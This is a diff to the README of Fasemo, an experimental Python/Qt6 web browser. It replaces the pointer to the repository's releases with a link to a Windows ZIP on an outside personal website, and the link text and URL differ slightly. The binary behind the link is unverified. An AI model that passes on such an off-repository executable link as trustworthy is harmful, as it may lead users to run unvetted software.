@@ -2,7 +2,11 @@
 Fasemo is an experimental, cross-platform web browser written in Python and Qt6.
 
 # Installation
-Select a build from the releases tag on the right.
+Download the Windows binary at my website:
+
+[https://cinemint.online/static/fasemo_windows.zip](https://cinemint.online/static/fasemo-windows.zip).
+
+Unpack the ZIP, run Fasemo.exe, and enjoy.
 
 # Build
 To build this yourself, make sure you install the packages from `requirements.txt`.
